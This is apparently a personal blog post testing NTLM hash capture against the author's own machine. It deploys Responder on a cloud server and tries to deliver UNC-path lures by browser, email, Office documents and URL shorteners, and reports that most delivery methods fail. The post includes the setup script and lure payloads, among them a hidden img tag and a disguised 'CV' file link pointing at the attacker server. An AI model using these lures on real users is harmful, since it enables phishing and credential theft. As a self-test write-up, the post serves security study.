# Objective
Hello everyone, we will take a quick look into how bad actors are capturing NTLM hashes and perform an attack on ourselves to see the full picture and how effective this technique is in 2025.

# WTH is NTLM ?
Let's start with a quick summary of what NTLM is, which will help you understand why we want to look after it and not give it away to anybody.

 NTLM or **NT LAN Manager** is a legacy protocol that was commonly used in the past by Microsoft products intended to provide authentication, integrity, and confidentiality to users. It was widely used before the advent of Kerberos(the protocol that controls authentication for **Active Directory**) and still exists in many environments for backward compatibility

When you attempt to connect to a resource over the network, you would often be prompted to submit your ID/Password, but sometimes this will be done in the underlining layers of the network without the user knowledge, giving it a seamless experience, we love that don't we?

Unfortunately, however, these seamless experiences can be abuse which is the case here, because the SMB authentication has been requested automatically a bad actor could host a file on its malicious server and send you the link. The moment you click on it, an authentication attempt will be initiated and if the bad actor is monitoring for those requests, he will capture your NTLM hash(encrypted password) and your login account.

After capturing the hash he would need to crack it first before doing anything bad to your account, (this is where a strong password would come in handy). He could 
- RDP to your machine, in case this was a server hosted on Azure/AWS
- User your password as a credential stuff attack and try to hack your other online accounts, if was using the same password

## Deploying Responder.py
Now that we move that out of the way, let's start with the fun stuff.
I am deploying a server on the cloud, this time I am using [Linode](https://cloud.linode.com/), but you can use any other IaaS you prefer.


Responder will act as a MitM(Man-in-the-middle) to help us capture the authentication requests that are made when someone tries to authenticate against our SMB server. 

Below is the script we will be using to deploy our Responder server.
```bash
sudo apt update && sudo apt upgrade -y  
sudo apt install net-tools -y  
#Download Install Responder  
git clone https://github.com/lgandx/Responder.git  
sudo apt install python3-pip -y  
sudo apt install python3.12-venv -y  
#Activate Envinronment  
cd Responder  
python3 -m venv venv  
source venv/bin/activate  
pip install -r requirements.txt  
# Run Server  
python3 ./Responder.py --interface eth0 -Pv
```

## Creating the link
Now with responder running, we just need to create a UNC path and send to the user. The link will be the public IP of your server followed by an imaginary file, it don't need to exist.

```
\\172.236.11.120/fakeFile.txt
```
Obs: This is one of Linode's IP and the server has been destroyed after the test, so don't worry you can't dox me.

When the user click on the UNC file path Windows will initiate an SMB request to our server and our Responder server will poison the request capturing the hash when that has been sent, and just like that we capture the user hash. Profit!
![[Pasted image 20250525015544.png]]

## Is it that easy?
- Yes! Just like that we capture the NTLM hash from the user computer.
## Where is the gotcha?
The difficult part is actually making the user click on the UNC link, or sending an actual link that will force the NTLM authentication request. This is not as easy as it used to be, security has evolved and local file manipulation by suspicious, or SMB links been sent over email nowadays is a no no.
### Over the browser
I tried a few methods to force the NTLM authentication to be automatically loaded from the website itself, but all browsers have security mechanism to stop local file manipulation from the browser itself.

I attempt to host a web server using nginx and a simple webpage that attempted to load the file using many methods but that failed.
- HTML
![[Pasted image 20250525003918.png]]

![[Pasted image 20250525001202.png]]

When trying to go to the server over HTTPS 
`http://172.236.11.120/SomethingHere.docx`
We are prompted to log in, if the user attempts to log in and fills up the username + password we will capture the request on the Responder server.
I can see a few inexperience users falling victim to this method, but you should be aware that if you are getting a random login prompt from a website you should **cancel it straight away**.

![[Pasted image 20250525004233.png]]
### Over Email
Another option would be to send the SMB share link over email as a hyperlink
`
```
<img src="\\172.236.11.120\share\image.jpg" style="display:none;" />
or
<a href="file://172.236.11.120/fakeCV.pdf">JohnDoe_CV.pdf</a>
```
For Outlook, this possible to send a UNC path over outlook anymore as the request will be blocked, I have tested this and Microsoft community has confirmed it [link here](https://answers.microsoft.com/en-us/outlook_com/forum/all/unable-to-paste-unc-path-into-email-does-not/9bb696b5-8263-4463-9016-30b965ca5d7b)

### **Embed in Office Documents for Auto-Trigger**
Office documents will also **automatically attempt NTLM auth** on UNC paths:
The idea here was to embed into an image the path of our SMB server to load the file from the `\\172.10.10.11/fakeFile.img`

This option has also failed(kind of). When trying to create the document. 
It was attempted to connect straight away and the NTLM hashes were being capture. However, the idea here, was to create the document first, save it, and close it so when it opens an automatic request would be sent. This test was not completed.
![[Pasted image 20250525002636.png]]
A full test would require to actually create a link to a share to a file that actually exist first, on a server, so the link could be created.


### URL Shortner websites
I tried a few URL shortened websites like [tinyURL](https://tinyURL.com) and [bitly](https://bitly.com/) but I quickly realized that would not work as it was transforming the request into an HTTP again, however, all the websites did not accept the format either
![[Pasted image 20250525002421.png]]
### Forcing SMB over HTTPS
When they visit the URL location there will be an attempt asking for the user to authenticate with the website.
![[Pasted image 20250525000647.png]]
If the user fills in the username/password to access the file it will perform a NTLM authentication request which will be captured by our server.
![[Pasted image 20250525000749.png]]

So how can we force the browser to attempt to log in with the current logon account, instead of asking the user? I am glad you asked.
To perform that we will need to change the Internet Options settings.
`Go to Internet Options → Security → Local Intranet → Sites → Add`
![[Pasted image 20250525001514.png]]

Now if the user would visit `172.236.11.120/fakeFile.txt `he would automatically perform a NTLM over HTTPs, and we could capture the hashes.
Of course this method is very hard to achieve as it requires adding the Responder server as a local resource, so from red team perspective it's not really practical.


## Conclusion
The only effective way I have found so far is if the user copy and paste the URL 
1. directly into the **run** command
![[Pasted image 20250525002004.png]]
2. Directly paste the link into the web browser himself
![[Pasted image 20250525002211.png]]

There might be other clever ways to trick the user to paste the UNC somewhere into the system, but from what I have been looking around lately the only option is to get the user to request the file manually.